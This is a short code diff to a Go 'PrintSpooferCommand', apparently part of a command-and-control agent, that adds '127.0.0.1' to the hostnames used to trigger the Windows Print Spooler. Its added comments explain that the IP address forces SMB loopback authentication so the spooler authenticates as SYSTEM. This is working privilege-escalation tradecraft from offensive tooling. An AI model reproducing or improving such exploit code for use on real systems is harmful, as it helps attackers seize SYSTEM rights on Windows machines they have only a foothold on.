@@ -165,12 +165,21 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 
 	alreadyConnected := connectErr == windows.ERROR_PIPE_CONNECTED
 
-	// Declare outside the if block so they're available for success output
+	// Declare outside the if block so they're available for success output.
+	// Hostname priority for triggering the Spooler:
+	// 1. Computer name (NetBIOS) — triggers SMB auth, yields SYSTEM
+	// 2. DNS FQDN — triggers SMB auth via DNS, yields SYSTEM
+	// 3. 127.0.0.1 — forces SMB loopback auth (not local pipe), yields SYSTEM
+	// 4. localhost — last resort, uses local pipe namespace, yields NETWORK SERVICE
+	// The 127.0.0.1 trick is key: unlike "localhost" which maps to the local
+	// pipe namespace, the IP address forces Windows to use SMB over TCP,
+	// causing the Spooler to authenticate as SYSTEM.
 	var triggerWarnings []string
 	hostnames := []string{computerName}
 	if dnsHostname != "" && dnsHostname != computerName {
 		hostnames = append(hostnames, dnsHostname)
 	}
+	hostnames = append(hostnames, "127.0.0.1")
 	hostnames = append(hostnames, "localhost")
 
 	if !alreadyConnected {
